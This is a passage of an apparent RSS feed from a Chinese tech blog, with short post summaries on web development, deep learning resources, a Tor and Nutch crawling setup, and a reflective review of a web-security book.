#E5D74C #CCC366 #B2AD7F #FFEA00 #DFCF20 #BFB440 #9F995F #E6D200 #C9BA1D #ACA239 #8F8A56 #C4B200 #AB9D18 #938A31 #7A7549 #9D8E00 #897D13 #756D27 #625E3B #766A00 #675E0F #58521D #49462C #554C00 #4A430A #3F3A15 #353320 #3C3500 #342F07 #2D290F #252316 #272300 #221F05 #1D1B0A #18170E #220013 #141203 #111006 #0E0D08 #F8FCF3″ #F8FBF4 #F7F9F5 #F7F8F6 #F2F9E8 #F2F7EA #F1F4EC #F0F2EE #E8F5D5 #E7F1D9 #E6EDDD #E6E9E1 #D9EFB9 #D8E8C0 #D8E8C0 #D5DACD #C4E693 #C2DB9D #C0D1A8 #BEC7B2 #ABDC65 #A8CD74 #A6BE83 #A3AF91 #90D133 #8CBD47 #88A95A #85956E #74C600 #6FAD19 #6B9431 #677B4A #69B319 #659C16 #61862D #5D7043 #61A500 #5D9014 #597B29 #56673E #549000 #517E12 #4E6C24 #4B5A36 #457700 #42680F #40591E #3D4A2C #355C00 #33500B #314517 #2F3922 #264200 #233908 #233110 #222919 #192C00 #182605 #17210B #161B10 #0F1A00 #0E1603 #0D1306 #0D100A #F7FAF6 #F7F9F6 #F7F9F7 #F7F8F7 #ECF5EB #EDF3EC #EEF2ED #EFF1EF #DFEEDD #E1ECDF #E2E9E1 #E3E7E3 #CBE4C9 #CDE0CC #D1DDD0 #D4DAD3 #B3D7B0 #B7D2B5 #BBCDBA #BFC8BE #96C792 #9BC098 #A1B99F #A7B3A6 #75B570 #7CAC78 #83A381 #8B9B8A #52A34C #5C9857 #658D62 #6E826C #2D8F26 #388233 #437440 #4F674D #087B00 #156B0F #235C1F #304D2E #076900 #125C0D #1D4E1A #294127 #065400 #0E490A #183F15 #20341F #054100 #0C3908 #123010 #192818 #043100 #092B06 #0E240C #131E12 #032200 #061D04 #0A1908 #0E150D #021600 #041303 #061005 #080D08 #F9FCFC #F9FBFB #FAFBFB #FAFBFB #F2F8F8 #F3F7F7 #F3F6F6 #F4F5F5 #E7F2F1 #E8F0EF #EAEFEF #EBEEEE #D6E9E7 #D8E6E4 #DBE4E3 #DDE2E1 #BDDCD9 #C1D8D6 #C5D4D2 #C8D0CF #9ECCC7 #A4C6C2 #A9C0BD #AFBAB9 #79B9B1 #81B1AB #89A9A5 #91A19F #51A59A #5B9A92 #66908A #708582 #268F81 #338277 #40746D #4D6763 #006F61 #0E6156 #1C534C #294541 #006054 #0C544B #184842 #243C39 #005147 #0A473F #143C37 #1E322F #00433A #083A33 #11322D #192A28 #00342D #062D28 #0D2723 #13201E #002722 #05221E #0A1D1A #0E1817 #001B18 #031715 #071413 #0A1110 #F0F5F5 #F0F4F4 #F1F3F3 #F2F3F3 #E6EFEF #E7EEEE #E8ECEC #E9EBEB #D8E6E7 #DAE4E5 #DCE3E3 #DDE1E1 #C6DBDC #C9D8D9 #CBD5D6 #CED3D3 #AFCCCE #B3C8CA #B7C5C6 #BAC1C2 #93BABD #98B5B7 #9DB0B2 #A3ACAD #74A6AB #7BA0A4 #829A9D #889596 #549198 #5C8A8F #658387 #6D7C7E #347C85 #3E747B #486B70 #526466 #196B75 #246169 #30595E #3B4F52 #005B66 #0D5159 #19464C #263C3F #00525C #0B4850 #174045 #223639 #00464E #0A3E44 #13363A #1D2E30 #00383E #083136 #0F2B2E #172426 #002A2F #062529 #0C2023 #111C1D #001D21 #041A1D #081618 #0C1314 #F6FCFF #F7FCFE #F8FBFC #F9FAFB #EDF9FF #EFF8FC #F1F7FA #F4F7F8 #E0F4FF #E4F3FB #E8F2F7 #EBF0F3 #CEEEFF #D4ECF9 #DAEAF2 #E0E8EC #B3E5FF #BCE1F5 #C6DFEC #CFDBE2 #90D9FF #9ED4F1 #ACD0E3 #B9CBD5 #65CBFF #78C4EB #8BBED8 #9FB8C5 #33BAFF #4CB1E5 #66A9CC #7FA1B2 #00A0F3 #1E95D4 #3D8CB6 #5B8398 #0092E0 #1C89C4 #3881A8 #54788C #0080C6 #1978AD #317194 #4A6A7B #006CA7 #156692 #2A5F7D #3E5968 #00588A #115378 #224E67 #344A56 #00456C #0D415E #1B3D51 #283943 #00324E #0A2F44 #132C3A #1D2930 #002235 #06202E #0D1E27 #141C21 #F7FAFF #F8FAFE #F9FAFD #FAFBFC #F1F6FF #F3F7FD #F4F6FB #F6F7F9 #E7F0FF #EAF1FC #EDF1F9 #F0F2F6 #D9E7FF #DEE8FA #E2E9F5 #E7EAF0 #C4DAFF #CBDBF7 #D3DEF0 #DAE0E9 #A8C9FF #B3CCF4 #BECEE9 #C8D0DE #85B3FF #94B6EF #A3BAE0 #B3BED1 #5B98FF #6F9DEA #84A2D6 #98A7C1 #2D7CFF #4782E4 #6188CA #7C8FB0 #0060FF #2068DF #4070BF #5F779F #0056E6 #1D5DC9 #3964AC #566B8F #0049C4 #184FAB #315593 #495B7A #003A9D #133E89 #274475 #3B4962 #002C76 #0F3067 #1D3358 #2C3749 #001F53 #0A2148 #15243E #1F2734 #001436 #07162F #0D1D28 #141921 #F8F8FD #F8F8FC #F9F9FB #FAFAFB #F3F3FB #F4F4FA #F5F5F9 #F6F6F8 #EBEBF9 #EDEDF7 #EEEEF5 #F0F0F3 #E1E1F6 #E3E3F3 #E6E6F0 #E9E9EE #D3D3F2 #D7D7EE #DBDBEA #DEDEE6 #C1C1ED #C6C6E7 #CCCCE2 #D1D1DC #ABABE7 #B2B2DF #BABAD8 #C1C1D0 #8F8FDF #9999D5 #A3A3CB #ADADC1 #6F6FD6 #7C7CC9 #8989BC #9595AF #4B4BCC #5B5BBC #6B6BAB #7B7B9B #2626C2 #3939AE #4D4D9B #606087 #2222AF #33339D #45458B #57577A #1C1C90 #2A2A81 #393973 #474764 #16166F #212164 #2C2C58 #37374D #101050 #181848 #202040 #282838 #0A0A34 #0F0F2E #141429 #1A1A24 #FAF8FE #FAF9FD #FAFAFC #FBFAFC #F3EDFC #F3EFFA #F4F2F6 #F4F2F6 #EBE2FA #ECE5F7 #ECE8F4 #EDEBF1 #E1D4F7 #E2D8F2 #E3DDEE #E4E1EA #D4C2F3 #D6C8ED #D7CEE6 #D8D4E0 #C3ABEE #C5B3E5 #C8BCDD #CAC4D5 #AF8FE8 #B29ADD #B5A5D1 #B8B0C6 #9970E1 #9D7ED3 #A08CC4 #A49AB6 #804CD9 #845DC7 #896FB5 #8E81A4 #6526D1 #6A3BBB #7051A6 #766691 #4B00C9 #5119B0 #573296 #5E4B7D #3E00A7 #431592 #492A7D #4E3E68 #300081 #341071 #382060 #3C3050 #23005D #250B51 #281745 #2C233A #190041 #1B0839 #1C1030 #1E1828 #10002A #110524 #120A1F #14101A #FAF8FC #F9F8FB #FAF9FB #F9F9FA #F6F2F9 #F6F3F8 #F6F4F7 #F5F4F6 #F0E9F5 #EFEAF3 #EFECF2 #EFEDF0 #E7DCEF #E6DEEC #E6E1EA #E6E3E8 #DACAE6 #D9CDE2 #D9D1DF #D8D4DB #CAB2DB #C9B7D6 #C8BCD0 #C7C1CB #B594CD #B49BC6 #B2A2BE #B1A9B7 #9D71BD #9B7AB3 #9A84AA #988DA0 #834CAC #8158A0 #7F6494 #7E7088 #68269A #65348B #64437D #61516E #4D0088 #4A1177 #4A1177 #463355 #420074 #3F0E65 #3E1D57 #3B2B48 #35005D #330B51 #311745 #30233A #260043 #24083A #241132 #23192A #19002D #180527 #170B21 #17111C #0E0019 #0E0316 #0D0612 #0C090F #FFF6FE #FEF7FD #FCF8FC #FBF9FB #FFEEFE #FDF0FC #FAF2F9 #F8F4F8 #FFE2FE #FBE5FA #F7E9F6 #F4EDF4 #FFD1FD #F9D7F7 #F3DCF2 #EDE2EC #FFB9FC #F6C2F4 #EDCAEB #E4D3E3 #FF99FA #F2A6EE #E5B2E2 #D8BFD7 #FF71F8 #ED83E7 #DB94D7 #C9A6C7 #FF3FF7 #E757E0 #CF6FCA #B787B5 #FF00F6 #DF20D8 #BF40BA #9F5F9C #E600DD #C91DC2 #AC39A7 #8F568D #BD00B6 #A5179F #8D2F89 #764774 #9C0095 #881383 #752771 #613A5F #7A0073 #6A0F64 #5B1E57 #4C2E4A #590054 #4E0B4A #42163F #372136 #3E003B #360834 #2E0F2C #261725 #270025 #220520 #1D0A1C #180E17 #FFF5FA #FDF6F9 #FCF7F9 #FBF9FA #FFE8F5 #FCEBF5 #F9EEF4 #F6F0F3 #FFD6ED #FADBEC #F4E0EB #EFE5EB #FFBEE2 #F7C6E1 #EECEE0 #E6D6DF #FFA2D6 #F3ADD4 #E7B9D3 #DCC5D2 #FF82C8 #EF91C6 #DFA1C4 #D0B1C2 #FF59B6 #EA6EB3 #D582B0 #C097AE #FF2DA4 #E447A0 #CA619C #B07C99 #FF0090 #DF208B #BF4087 #9F5F83 #E60081 #C91D7D #AC3979 #8F5676 #C4006D #AB186A #933167 #7A4964 #A1005A #8D1458 #782855 #643C52 #7C0046 #6C0F43 #5D1F42 #4D2E3F #590033 #4E0B31 #42162F #37212E #3A0021 #32071F #2B0E1E #24161E #220013 #1D0412 #190811 #150D11 #FFFFFF #FBFBFB #F8F8F8 #F4F4F4 #EEEEEE #E5E5E5 #DDDDDD #D0D0D0 #C0C0C0 #ADADAD #989898 #808080 #666666 #4B4B4B #262626 </description>
    </item>
    <item>
      <title>The nice WEB for DL</title>
      <link>https://anwangtanmi.github.io/posts/9a24ee79ef3b14c43bfa2766aa851672/</link>
      <pubDate>Mon, 09 Oct 2017 16:48:45 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9a24ee79ef3b14c43bfa2766aa851672/</guid>
      <description>Hello!This is my first blog for DL,now I will shape some great Webs which may better and efficiently learn DL. 1 NOTE paper and code for tracking:&#xA;http://blog.csdn.net/cyh_24/article/details/51592156&#xA;2 Deep Learning papers reading roadmap for anyone who are eager to learn this amazing tech:&#xA;https://github.com/songrotek/Deep-Learning-Papers-Reading-Roadmap&#xA;3 CS231n course learn:&#xA;https://zhuanlan.zhihu.com/p/21930884&#xA;to be continued…</description>
    </item>
    <item>
      <title>bootstrap的日期选择器</title>
      <link>https://anwangtanmi.github.io/posts/1ecff17927af9f2c1190c0d1d892ce9b/</link>
      <pubDate>Sat, 02 Sep 2017 11:57:26 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/1ecff17927af9f2c1190c0d1d892ce9b/</guid>
      <description>首先导入js和css文件&#xA;添加input文本框 添加js代码 ps：文本框必须处在一个绝对定位的框架内，比如：&#xA;如果像下面这样没有绝对定位，则会产生错误&#xA;datetimepicker component should be placed within a non-static positioned container 给个最简单的方法，在input的上级div中加上绝对定位</description>
    </item>
    <item>
      <title>使用Nutch爬取暗网（.onion）</title>
      <link>https://anwangtanmi.github.io/posts/c9539e45aaf09fe63e9defd2c3324b55/</link>
      <pubDate>Fri, 11 Aug 2017 10:12:23 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/c9539e45aaf09fe63e9defd2c3324b55/</guid>
      <description>抱着学习的态度，简单翻译了一个正在使用的教程，水平有限，如有错误多多包涵，自己也是刚接触到这个东西很多都不是很明白，需要解下来具体实践一下才能清楚，在这里简单贴一下译文，希望能帮助需要的人：&#xA;使用Nutch爬取暗网（.onion） 目录： 1.使用Nutch爬取隐藏服务（.onion） 1.重要提示 2.介绍 3.快速入门 4.安装Tor 1.Debian 或者 Ubuntu 2.Mac OSX 3.从git克隆源码 5.Tor日志 6.Socks代理异常 1.Polipo配置 1.在Debian或Ubuntu上 2.在Mac OSX上 2.代理 1.在Debian或Ubuntu上 2.在Mac OSX上 7.Nutch爬虫配置 8.结论 重要提示： 教程的目的是解释如何爬取隐藏服务而非怎么去使用隐藏服务来爬取。这是在读取和使用TOr网络的时候都应该考虑到的。通过Tor网络来爬取正常的网站无疑会加重Tor的网络负载。但是在Tor中你可以突破网络的封锁，访问到你想访问的网站，但是如果你执意想使用Tor和Nutch来爬取常规网站的话，你肯定走错地方了。 介绍： Tor是一个虚拟的网络通道，能够保证用户的隐私安全，也能够为软件开发者使用内置的隐私特性创造新的的沟通工具。Tor提供了广泛的应用基础，允许组织机构和个人共享他们的信息而不用考虑隐私的问题。这个教程提供了一个端到端的实例进入到Tor网络使用Nutch爬虫来爬去“.onion”网页 快速入门： 这个教程在Debian和Ubuntu已经完成测试，也可以在Mac OSX上运行。 Tor安装： 从这里下载安装配置代理相关即可，详情百度 https://www.torproject.org/ Debian or Ubuntu： 可以参考这里安装：https://www.torproject.org/docs/debian 也可以使用命令：apt-get install tor Mac OSX： 使用命令： brew install tor，之后使用tor可看到下面提示： lmcgibbn@LMC-032857 /usr/local/tor(master) $ tor Sep 23 17:09:47.448 [notice] Tor v0.2.4.23 (git-598c61362f1b3d3e) running on Darwin with Libevent 2.0.21-stable and OpenSSL 1.0.1i. Sep 23 17:09:47.</description>
    </item>
    <item>
      <title>maven的动态web项目从搭建到运行完整示例（dark亲测可用）</title>
      <link>https://anwangtanmi.github.io/posts/cca7f08345baea5a61a1634fe3fced77/</link>
      <pubDate>Tue, 01 Aug 2017 16:45:50 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/cca7f08345baea5a61a1634fe3fced77/</guid>
      <description>原文地址点击此处&#xA;当前eclipse版本为 neon3 、jdk为1.8.25 、tomcat为8.5&#xA;需求表均同spring案例&#xA;此处只是使用maven&#xA;注意,以下所有需要建立在你的eclipse等已经集成配置好了maven了,说白了就是新建项目的时候已经可以找到maven了&#xA;没有的话需要安装maven&#xA;1.新建maven项目,由于当前版本的eclipse自带maven插件，如下图所示。如果没有请自行百度安装maven插件&#xA;2,进入maven项目之后,点击next&#xA;选择webapp之后 next&#xA;输入两个id package可以不写,是它默认帮你新建一个包,不写没关系&#xA;会生成一个这样目录的项目&#xA;2,配置maven&#xA;首先新建几个文件夹&#xA;2.1 添加Source文件夹&#xA;接下来需要添加&#xA;src/main/java&#xA;src/test/java src/test/resources三个文件夹&#xA;右键项目根目录点击New -&amp;gt; Source Folder，&#xA;建出这三个文件夹。注意不是建普通的Folder，而是Source Folder。&#xA;项目或者文件加上右键 new sourceFolder,正常情况下是没有问题的&#xA;如果出现了下面的这情况,其实是真的存在的只是我们看不到&#xA;项目右键属性&#xA;修改jdk为你使用的jdk，比如我自己的就是1.8.025&#xA;设置完毕之后自然会发现src/main/java这个source folder出现啦。&#xA;然后看一下，src/main/sources、src/test/java、src/test/resources这三个哪个没有就建哪个，效果如下&#xA;2.2 更改class路径&#xA;右键项目，Java Build Path -&amp;gt; Source&#xA;下面应该有4个文件夹。src/main/java，src/main/resources，src/test/java ，src/test/resources。&#xA;双击每个文件夹的Output folder，选择路径。&#xA;src/main/java，src/main/resources，选择target/classes;&#xA;src/test/java ，src/test/resources, 选择target/test-classes;&#xA;选上Allow output folders for source folders.（如果没有选上的话）&#xA;点击左侧属性 project Facets，想要切换成3.1发现报错&#xA;这是因为当前版本的eclipse在新建项目的时候，默认使用maven-artchetype-webapp&#xA;这个的catalog比较老，对应的servlet还是2.3的&#xA;Archetype Created Web Application 打开当前项目对应的workspace，找到当前工程文件夹下的.</description>
    </item>
    <item>
      <title>关于ArcGIS API for JavaScript中basemap的总结介绍（一）</title>
      <link>https://anwangtanmi.github.io/posts/06d2c6f87201d0a0046db41a6fa79fb8/</link>
      <pubDate>Wed, 28 Jun 2017 14:51:44 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/06d2c6f87201d0a0046db41a6fa79fb8/</guid>
      <description>实际上basemap这个概念并不只在arcgis中才有，在Python中有一个matplotlib basemap toolkit（https://pypi.python.org/pypi/basemap），是用来实现地理信息可视化的。其中，matplotlib是Python常用的数据绘制包，basemap是matplotlib的一个子包，用来进行地图绘制。本文所指的basemap是指esri提供的基础底图图层。&#xA;正式使用basemap是在前一阵做webgis开发的时候，需要在自己的矢量图层下面加一个底图图层，发现网上的相关文档不多，所以整理了一下帮助文档和demo，分享给大家。&#xA;首先，看一下arcgis帮助文档中对GIS basemap的介绍（http://resources.arcgis.com/zh-cn/help/main/10.1/index.html#/na/00s500000017000000/），因为重点介绍arcgis API，所以关于arcmap的操作方法和步骤不再赘述，只是简单介绍一下基础底图的概念：&#xA;底图图层属于一类地图图层，提供了一个可显示动态操作信息的框架。底图显示性能非常强大。由于底图图层相对稳定，不常发生变化，因此其显示只需计算一次，然后便可以多次重复使用。首次以特定的地图比例访问某个区域时，会对底图图层的显示进行计算。以后再以此地图比例访问该区域时，可调出该显示。众多 ArcMap 应用程序中都包括可用于显示和使用操作性信息、观测值和从分析模型中获取的信息的底图。底图用于位置参考，并为用户提供叠加或聚合业务图层、执行任务以及可视化地理信息的框架。底图是执行所有后续操作和地图制图的基础，它为地理信息的使用提供了环境和框架。底图相对稳定，并且在典型设置下，并不需要经常更新。此外，底图常常可在多种地图比例下使用。在各种地图比例范围内，底图都可以描绘出对应的内容。&#xA;接下来，重点介绍一下arcgis API for JS中esri提供的已有的17种basemap（包括”satellite”,”hybrid”,”streets”,”topo”,”osm”和”national-geographic”等等），包括代码和示例。&#xA;在下载的arcgis_js_api包中有一个basemaps.js文件（路径为arcgis_js_api\3.17\esri），里面定义了esri提供的全部的basemap，下面贴出了这个js文件中的详细代码：&#xA;1 // All material copyright ESRI, All Rights Reserved, unless otherwise specified. 2 // See http://js.arcgis.com/3.17/esri/copyright.txt for details. 3 //&amp;gt;&amp;gt;built 4 define(&#34;esri/basemaps&#34;, [&#34;require&#34;, &#34;dojo/has&#34;, &#34;./kernel&#34;, &#34;dojo/i18n!./nls/jsapi&#34;], function(a, c, d, b) { 5 a = { 6 streets: { 7 title: b.basemaps.streets, 8 thumbnailUrl: a.toUrl(&#34;./images/basemap/streets.jpg&#34;), 9 itemId: &#34;d8855ee4d3d74413babfb0f41203b168&#34;, 10 baseMapLayers: [{ 11 url: &#34;http://services.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer&#34; 12 } 13 ] 14 }, 15 satellite: { 16 title: b.</description>
    </item>
    <item>
      <title>开发你的第一个React &#43; Ant Design网页(一、配置&#43;编写主页)</title>
      <link>https://anwangtanmi.github.io/posts/50a74bf3d9a7aed89bc797f1606fa119/</link>
      <pubDate>Wed, 14 Jun 2017 15:55:13 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/50a74bf3d9a7aed89bc797f1606fa119/</guid>
      <description>前言 React是Facebook推出的一个前端框架，之前被用于著名的社交媒体Instagram中，后来由于取得了不错的反响，于是Facebook决定将其开源。出身名门的React也不负众望，成功成为当前最火热的三大前端框架之一。相比于Angular，React更加轻量。而相对于另一个轻量级前端框架Vue来说，React虽然学习和使用起来难度稍微大一些，但是React的社区相对来说人气更旺，而且在移动端的开发上面，大名鼎鼎的React Native更是尽显优势，在代码性能上要好过Vue框架。今天我们就来对React进行一个入门的学习。 这里还要用到的是一个UI设计语言，Ant Design。Ant Design同样出身名门，是阿里巴巴旗下蚂蚁金融服务集团（旗下拥有支付宝、余额宝等产品）所设计的一个前端UI组件库。目前支持了React， 并且有一个对Vue支持的测试版本。&#xA;正文 配置 这里我们需要用到的开发工具有&#xA;Webstorm Node.js(npm) 或 Yarn&#xA;关于Webstorm的安装和npm的配置，在我的另一篇博客 从零开始搭建自己的VueJS2.0+ElementUI单页面网站（一、环境搭建） 里面有详细的介绍。这里不再赘述。 我们进入命令行，输入&#xA;npm install -g create-react-app yarn 对create-react-app这个脚手架进行全局安装。然后进入到我们的workspace中，输入如下代码&#xA;create-react-app antd-demo 就可以创建一个名字为andt-demo的React工程。创建的过程很有特点，像是在给硬盘整理碎片。 创建完之后我们就可以在Webstorm中打开这个工程。目录结构如下 这个时候我们就完成了最基本的工程创建。如果我们此时在命令行中进入这个工程，并输入&#xA;npm start 稍等一会之后浏览器会启动一个新的标签页。如图。&#xA;这里面使用了热加载技术，我们在代码中做出的改变会实时显示在页面上。&#xA;接下来我们还要做一件事: 引入Ant design的组件库:&#xA;yarn add antd 这样工程就已经配置完毕了。&#xA;创建主页 在src中创建一个文件夹，名为Navi，在Navi文件夹下面创建一个Navi.js和一个Navi.css文件。 在Navi.js中，加入如下代码&#xA;import { Layout, Menu, Breadcrumb, Icon } from &#39;antd&#39;; import React, { Component } from &#39;react&#39;; import &#39;antd/dist/antd.css&#39;; import logo from &#39;../logo.svg&#39;; import &#39;./Navi.css&#39; const { Header, Content, Footer, Sider } = Layout; class SiderDemo extends Component { state = { collapsed: false, mode: &#39;inline&#39;, }; toggle = () =&amp;gt; { this.</description>
    </item>
    <item>
      <title>Three.js基础探寻四——立方体、平面与球体</title>
      <link>https://anwangtanmi.github.io/posts/9b65cb8504a575320b4e2b00a1787a78/</link>
      <pubDate>Sun, 11 Jun 2017 18:16:44 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9b65cb8504a575320b4e2b00a1787a78/</guid>
      <description>1.立方体　虽然这一形状的名字叫立方体（CubeGeometry），但它其实是长方体，也就是长宽高可以设置为不同的值。其构造函数是： THREE.CubeGeometry(width,height,depth,widthSegments,heightSegments, depthSegments) width：x方向上的长度　height：y方向上的长度　depth：z方向上的长度　widthSegments：x方向上的分段数（可选，缺省值1）　heightSegments：y方向上的分段数（同上）　depthSegments：z方向上的分段数（同上）　未分段：&#xA;var material = new THREE.MeshBasicMaterial({　color: 0xffff00,　wireframe: true});drawCube(scene, material);function drawCube(scene, material) {　var cube = new THREE.Mesh(new THREE.CubeGeometry(1, 2, 3), material);　scene.add(cube);} 物体的默认位置是原点，对于立方体而言，是其几何中心在原点的位置。　分段：&#xA;var cube = new THREE.Mesh(new THREE.CubeGeometry(1, 2, 3, 2, 2, 3), material); 为什么会有这么多邪线呢？版本问题。R73版本：　注意这个分段是对六个面进行分段，而不是对立方体的体素分段，因此在立方体的中间是不分段的，只有六个侧面被分段。 2.平面　这里的平面（PlaneGeometry）其实是一个长方形，而不是数学意义上无限大小的平面。其构造函数为： THREE.PlaneGeometry(width, height, widthSegments, heightSegments) width：x方向上的长度　height：y方向上的长度　widthSegments：x方向上的分段数（可选，缺省值1）　heightSegments：y方向上的分段数（同上）　new THREE.PlaneGeometry(2, 4);创建的平面在x轴和y轴所在平面内，效果如下：3.球体　球体（SphereGeometry）的构造函数是： THREE.SphereGeometry(radius,segmentsWidth,segmentsHeight,phiStart, phiLength, thetaStart, thetaLength)// radius：半径// segmentsWidth：经度上的分段数// segmentsHeight：纬度上的分段数// phiStart：经度开始的弧度// phiLength：经度跨过的弧度// thetaStart：纬度开始的弧度// thetaLength：纬度跨过的弧度 3.</description>
    </item>
    <item>
      <title>通过学习bootstrop导航条学会修改bootstrop颜色基调</title>
      <link>https://anwangtanmi.github.io/posts/9d8ae169634df1e7e9722aeb718d7a2d/</link>
      <pubDate>Sun, 11 Jun 2017 14:36:27 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/9d8ae169634df1e7e9722aeb718d7a2d/</guid>
      <description> 通过bootstrap文档对导航条样式的设置发现，其实本身是有一个类似于主题的概念 – navbar-default：默认的外观 – navbar-inverse：暗色背景的样式 – 所以我们希望可以通过自定义一套完整的风格： 比如自定义一个颜色基调 名字 navbar-itcast&#xA;.navbar-itcast{ ... } ...具体代码参考navbar-default实现即可 </description>
    </item>
    <item>
      <title>37 WebGL多个模型组成一个复杂的模型</title>
      <link>https://anwangtanmi.github.io/posts/054467c9ea417f00f0534977cc88c08e/</link>
      <pubDate>Sat, 10 Jun 2017 23:14:33 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/054467c9ea417f00f0534977cc88c08e/</guid>
      <description>案例查看地址：点击这里&#xA;Title 相对于上一节的代码，着色器部分一点都没有修改。&#xA;在keydown()事件中，增加了新增部件的旋转角度变量，并相应的增加了鼠标控制的事件。&#xA;在draw()函数内，将额外增加的结构也相应的绘制出来。模型的各个部件base、arm1、arm2、palm、finger1和finger2等虽然都是立方体，但是长宽各不相同，所以本例相应的扩展了drawBox()函数，添加了三个参数width(宽度)、height(高度)和depth(深度)。&#xA;为什么会需要添加pushMatrix()和popMatrix()两个存储矩阵的压栈和出栈？&#xA;因为如果按以前的那样顺序绘制的话，finger2关联的地方将不是手掌palm，而是finger1，所以，在绘制finger1之前，将矩阵存储起来，然后在绘制完finger1之后，再绘制finger2，这样两个手指都关联到了手掌palm上了。只要栈足够深，用这种方法就可以绘制任意复杂的层次结构模型。我们只需要按照层次结构，从高到底绘制部件，并在绘制“具有兄弟部件”的部件前将模型矩阵压入栈，绘制完再弹出即可。&#xA;为什么drawBox()函数内部也需要压栈入栈？&#xA;drawBox()函数首先将模型矩阵乘以由width、height和depth参数组成的缩放矩阵，是绘制出的立方体尺寸与设想的一样。如果不是用压栈出栈，绘制第一个的缩放矩阵，会对第二个绘制的缩放矩阵产生一定的影响，所以，要将缩放之前的默认大小保存下来，就用到了。</description>
    </item>
    <item>
      <title>javascripts操作DOM（Document Object Model）</title>
      <link>https://anwangtanmi.github.io/posts/433f72e05d8b2a46510cca7beef2ea06/</link>
      <pubDate>Sun, 04 Jun 2017 18:20:54 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/433f72e05d8b2a46510cca7beef2ea06/</guid>
      <description> Document=网页 Object Model=操作方法&#xA;Web-API参考 文档对象模型DOM（中文）&#xA;事件绑定 where：特定区域&#xA;how：触发事件&#xA;what：做一些事情&#xA;把背景从白色变成黑色&#xA;var b = document.querySelector(&#34;body&#34;); b.setAttribute(&#34;style&#34;,&#34;background-color:black;&#34;); var dark = &#34;background-color: black; color: white;&#34;; var day = &#34;background-color: white; color: black;&#34;; var button = document.querySelector(&#34;.nav&#34;); var web = document.querySelector(&#34;body&#34;); function lightSwitch() { if (web.style.cssText==dark){ web.style.cssText = day; alert(&#34;Day mode&#34;); } else{ web.style.cssText = dark; alert(&#34;Night mode&#34;); } } button.onclick = lightSwitch 将广告去除 el = document.querySelector(&#34;#content_right&#34;); el.setAttribute(&#34;style&#34;,&#34;display:none&#34;); ///将display的block变为none </description>
    </item>
    <item>
      <title>《白帽子讲Web安全》读后感 —— 对道哥的致敬</title>
      <link>https://anwangtanmi.github.io/posts/e9bcb2b69345a498f1cd8ab261b5441c/</link>
      <pubDate>Mon, 22 May 2017 20:37:51 +0800</pubDate>
      <guid>https://anwangtanmi.github.io/posts/e9bcb2b69345a498f1cd8ab261b5441c/</guid>
      <description>《白帽子讲Web安全》读后感 ——Deep Blue (一个安全小兵的感受) 这是一篇作业；这是一篇读后感；这是一篇记录安全的感悟；这是一篇对道哥的敬仰；这是我安全启蒙的钥匙……&#xA;和《白帽子讲Web安全》的缘分来自一个小意外，在来大学之前的我选择了信息安全这个专业。通过各种渠道吧，我在方方面面了解到这个行业的那些事儿，一点一滴的积累这我的安全观。指导我遇见这本书，第一次觉得安全原来是那么清晰的展示在我眼前。“互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了”当我看到这一句的时候，毫不犹豫的把它作为我的签名，原来我们才是让互联网变得不安全的人啊！&#xA;初来大学，第一次进入图书馆。当我发现AUST图书馆也藏有这本书的时候，我是多么激动，转便了所有的书架找到这本书。可以说是笑着抱回宿舍，开始了我的第一次阅读。&#xA;第一次看道哥的作品难度还是很大的，整本书四篇十八章，包括世界观安全、客户端脚本安全、服务端应用安全以及互联网公司安全运营四大部分。当时还是大一小萌新的我只看了世界观安全，第一次彻底了解到ROOT是个啥，以前只知道手机ROOT能删除一些系统应用。当我知道“root”对黑客的吸引，就像大米对老鼠，美女对色狼的吸引的时候，立下一个小flag拿下一个网站的root。不想拿到“root”的黑客，不是好黑客。说到黑客我也又不得不多说点，在黑客的世界里，有的黑客，精通计算机技术，能够自己挖掘漏洞，并编写“exploit”（黑客们使用的漏洞利用代码叫做exploit）；而有的黑客，只是对攻击本身感兴趣，对计算机原理和各种编程技术的了解比较粗浅，因此只懂得编译别人的代码，自己并没有动手能力，这种黑客被称为“Script Kids”（脚本小子）。在现实世界中，真正造成破坏的，往往并非那些挖掘并研究漏洞的“黑客们”，而是这些脚本小子。在安全的道路上总是有人疑惑自己已经到了那一步，曾看到这样一个分级：会使用工具找漏洞就属于初级，能写自己的黑客工具应该就是中级阶段，能自动化“挖漏洞”就属于高级的大牛了。谈黑客，这本书中的黑客简史真的深深的吸引了我。&#xA;中国黑客发展分为三个阶段：启蒙时代、黄金时代、黑暗时代&#xA;启蒙时代&#xA;20世纪90年代，也正是中国互联网刚刚起步阶段，热爱新兴技术的青年收到国外黑客技术影响，开始研究安全漏洞。启蒙时代的黑客大多由于个人爱好走上这条路，好奇心和求知欲是他们前进的动力，没有任何利益瓜葛。这个时期的中国黑客们通过互联网，看到了世界，因此与西方发达国家同期诞生的黑客精神是一脉相传的，他们崇尚分享、自由、免费的互联网精神，并热衷于分钟自己的最新研究成果。&#xA;黄金时代&#xA;以2001年中美黑客大战为标志（感兴趣的同学可以百度一下“中美黑客大战”，相信大家都记得2001年中国飞行员王伟为了捍卫国家主权，被美国侦察机撞毁事件，起因正是这件事，这次事件中，中国黑客空前团结，与美国黑客开展了一场激烈的黑客大战，非常轰动，也这是世界第一次黑客大战），这次事件大大推动了中国黑客的发展，崛起了一批黑客、红客联盟，也让黑客这个特殊群体一下吸引了社会的眼球，黑客圈子所宣扬的黑客文化和黑客技术的独特魅力也吸引了无数的青少年走上黑客这条道路。这次事件之后，各种黑客组织如雨后春笋般冒出，他们普遍的特点是：年轻、有活力、充满激情，但技术上也许还不够成熟。此时，黑客圈子里贩卖漏洞、恶意软件的现象开始升温，因为黑客群体良莠不齐，开始出现以赢利为目的的攻击行为，黑色产业链逐渐成型。&#xA;黑暗时代&#xA;这个时代大概从几年前开始一直持续到现在（PS. 